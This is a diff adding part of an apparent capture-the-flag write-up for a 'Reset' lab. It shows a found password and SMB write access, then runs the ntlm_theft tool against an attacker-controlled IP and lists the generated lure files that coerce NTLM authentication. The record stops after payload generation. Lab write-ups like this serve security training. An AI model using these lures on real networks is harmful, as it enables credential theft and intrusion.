@@ -120,5 +120,49 @@ Subject: Welcome to Reset -Dear <USER>,Welcome aboard! We are thrilled to have y
 ```
 checking the content of the txt file, we got a password `ResetMe123!`. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5e223f93-149f-4968-8463-5715d888acb6)
+
+we have write permission to the smb server, 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dc3c8f28-22d9-4686-8eab-bccdd5fc58e7)
+
+after long research we got how to steal ntlm hash using responder with this ntlm_theft payload. [payload_gen](https://github.com/Greenwolf/ntlm_theft).
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/2b0c83d9-912b-4342-9f76-e4f45ae42036)
+
+```shell
+┌──(root㉿kali)-[~/ntlm_theft]                                                                                                                              
+└─# python ntlm_theft.py                                                                                                                                    
+usage: ntlm_theft.py --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>
+ntlm_theft.py: error: the following arguments are required: -g/--generate, -s/--server, -f/--filename
+                                                                                                                                                            
+┌──(root㉿kali)-[~/ntlm_theft]                                                
+└─# python ntlm_theft.py --generate all --server 10.10.135.72 --filename testing 
+Created: testing/testing.scf (BROWSE TO FOLDER)              
+Created: testing/testing-(url).url (BROWSE TO FOLDER)
+Created: testing/testing-(icon).url (BROWSE TO FOLDER)                        
+Created: testing/testing.lnk (BROWSE TO FOLDER)                               
+Created: testing/testing.rtf (OPEN)                                           
+Created: testing/testing-(stylesheet).xml (OPEN)                              
+Created: testing/testing-(fulldocx).xml (OPEN)                                
+Created: testing/testing.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: testing/testing-(includepicture).docx (OPEN)
+Created: testing/testing-(remotetemplate).docx (OPEN)
+Created: testing/testing-(frameset).docx (OPEN)
+Created: testing/testing-(externalcell).xlsx (OPEN)
+Created: testing/testing.wax (OPEN)
+Created: testing/testing.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: testing/testing.asx (OPEN)
+Created: testing/testing.jnlp (OPEN)
+Created: testing/testing.application (DOWNLOAD AND OPEN)
+Created: testing/testing.pdf (OPEN AND ALLOW)
+Created: testing/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: testing/Autorun.inf (BROWSE TO FOLDER)
+Created: testing/desktop.ini (BROWSE TO FOLDER)
+Generation Complete.
+```
+run the exploit to see how it works and generated some payloads we can use. 
+
+
 
 
